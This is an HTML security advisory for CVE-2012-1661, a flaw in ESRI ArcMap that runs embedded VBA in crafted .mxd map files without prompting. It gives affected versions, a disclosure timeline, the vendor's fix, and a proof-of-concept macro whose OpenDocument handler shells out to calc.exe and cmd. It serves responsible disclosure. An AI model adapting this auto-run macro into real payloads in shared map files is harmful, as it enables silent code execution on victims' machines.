<html>
<head>

<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="description" content="Opening a specially crafted mxd file will execute arbitrary
code without prompting and without a crash of the application.
This is due to a flaw in the programs ability to prompt a user
before executing embedded VBA. Mxd files are not filtered by
email systems so this allows a remote attacker to trick a user
into opening a map file via email and unknowingly gain control
over their system.">


<title>CVE-2012-1661 - ESRI ArcMap arbitrary code execution via crafted map file.</title>

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-19564702-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
<script type="text/javascript" src="syntaxhighlighter/scripts/shCore.js"></script>
<script type="text/javascript" src="syntaxhighlighter/scripts/shBrushJScript.js"></script>
<link type="text/css" rel="stylesheet" href="syntaxhighlighter/styles/shCoreDefault.css"/>
<script type="text/javascript">SyntaxHighlighter.all();</script>
</head>
<body>
<h1>
ESRI ArcMap arbitrary code execution via crafted map file.
</h1>
<pre>
<b>Reference: CVE-2012-1661</b>

<b>Discovered by:</b> Joseph Paul Cohen

<b>Description:</b>
Opening a specially crafted mxd file will execute arbitrary
code without prompting and without a crash of the application.
This is due to a flaw in the programs ability to prompt a user
before executing embedded VBA. Mxd files are not filtered by
email systems so this allows a remote attacker to trick a user
into opening a map file via email and unknowingly gain control
over their system.

<b>Versions affected (maybe more):</b>
ArcMap 9
ArcGIS Desktop 10
 Release Version: 10.0
 Product Version: 10.0.1.2800
 ArcGIS Service Pack: 1 (build 10.0.1.2800)
ArcGIS Desktop 10
 Release Version: 10.0
 Product Version: 10.0.2.3200
 ArcGIS Service Pack: 2 (build 10.0.2.3200)


<b>Proof of concept:</b>
If the following macro is implemented in the project 
the Shell statements will be executed when the 
document is opened without prompt.
</pre>
<pre style="font-size: small;">
Private Function MxDocument_OpenDocument() As Boolean
  Shell "calc.exe", vbNormalFocus
  Shell "cmd /c start http://www.cs.umb.edu/~joecohen/exploits/CVE-2012-1661.htm", vbNormalFocus
End Function
</pre>
<pre>
<b>Files:</b>

Not released yet

<b>Disclosure History:</b>
Received CVE Number: Mar 12, 2012 
Contacted ESRI: Mar 13, 2012
ESRI acknowledged issue: Apr 11, 2012
Public: June 12, 2012

<b>ESRI Response:</b>
"HowTo:  Ensure that a prompt is displayed when opening an MXD in ArcMap prior to executing embedded VBA"
<a href="http://support.esri.com/en/knowledgebase/techarticles/detail/40384">http://support.esri.com/en/knowledgebase/techarticles/detail/40384</a>

<b>Video:</b>
</pre>
<video src="CVE-2012-1661.ogv" controls>
        You need html5 for the video
</video>

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-19564702-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<center>
<script type="text/javascript"><!--
google_ad_client = "ca-pub-2068283315745938";
/* For Gravity Games */
google_ad_slot = "4493843169";
google_ad_width = 234;
google_ad_height = 60;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</center>

</body>
</html>